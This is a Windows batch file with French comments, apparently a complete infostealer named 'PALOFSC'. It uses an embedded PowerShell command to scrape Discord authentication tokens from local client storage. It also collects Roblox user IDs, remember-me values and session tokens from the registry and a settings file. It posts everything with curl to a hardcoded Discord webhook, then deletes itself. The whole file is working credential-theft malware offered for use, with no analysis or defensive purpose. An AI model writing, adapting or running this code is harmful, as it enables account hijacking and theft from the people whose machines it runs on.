@echo off
setlocal enabledelayedexpansion
:: PALOFSC - EXFILTRATION TOTALE (VERSION UNE LIGNE POWERSHELL)

set "WEBHOOK=https://discord.com/api/webhooks/1524390694376964226/1JXT_Rnb0ocyCJDBnZPuyY9qLctiKxsQe_-phkaif_Hap7ZbRugKdshY6wlYp9Jyq1T8"

:: ETAPE 1 : EXTRAIRE LES TOKENS DISCORD VIA UNE COMMANDE POWERSHELL UNIQUE
for /f "delims=" %%a in ('powershell -NoProfile -ExecutionPolicy Bypass -Command "$p=@($env:APPDATA+'\Discord\Local Storage\leveldb', $env:APPDATA+'\discordptb\Local Storage\leveldb', $env:APPDATA+'\discordcanary\Local Storage\leveldb'); $t=@(); foreach($d in $p){if(Test-Path $d){Get-ChildItem $d -Filter *.log | ForEach-Object {Select-String -Path $_.FullName -Pattern '[a-zA-Z0-9_\-]{24,28}\.[a-zA-Z0-9_\-]{6,7}\.[a-zA-Z0-9_\-]{27,38}' -AllMatches | ForEach-Object {$_.Matches.Value}} | ForEach-Object {$t+=$_}}} ; $t -join ' '" 2^>nul') do set "tokens=%%a"

:: ETAPE 2 : RECUPERATION DES DONNEES ROBLOX (registre + fichier XML)
set "roblox_user="
set "roblox_pass="
set "roblox_token="
for /f "tokens=3*" %%a in ('reg query "HKCU\Software\Roblox\RobloxStudio" /v "UserID" 2^>nul') do set "roblox_user=%%a"
for /f "tokens=3*" %%a in ('reg query "HKCU\Software\Roblox\RobloxStudio" /v "RememberMe" 2^>nul') do set "roblox_pass=%%a"
if exist "%LOCALAPPDATA%\Roblox\GlobalBasicSettings_13.xml" (
  for /f "tokens=2 delims=<>" %%a in ('findstr /r /c:"<token>" "%LOCALAPPDATA%\Roblox\GlobalBasicSettings_13.xml" 2^>nul') do set "roblox_token=%%a"
)

:: ETAPE 3 : CONSTRUCTION DU MESSAGE
set "msg="
if not "!tokens!"=="" set "msg=!msg!Tokens Discord : !tokens!\n"
if not "!roblox_user!"=="" set "msg=!msg!Roblox UserID : !roblox_user!\n"
if not "!roblox_pass!"=="" set "msg=!msg!Roblox RememberMe : !roblox_pass!\n"
if not "!roblox_token!"=="" set "msg=!msg!Roblox Token : !roblox_token!\n"
if "!msg!"=="" set "msg=Aucune donnee collectee.\n"

:: Echappement JSON
set "msg=!msg:"=\"!"
set "msg=!msg:\n=\\n!"

:: ETAPE 4 : ENVOI VIA CURL
curl -s -H "Content-Type: application/json" -d "{\"content\":\"%msg%\"}" "%WEBHOOK%" >nul 2>&1

:: ETAPE 5 : NETTOYAGE ET AUTO-SUPPRESSION
set "tokens="
set "roblox_user="
set "roblox_pass="
set "roblox_token="
set "msg="
del /f /q "%~f0" >nul 2>&1
exit /b 0
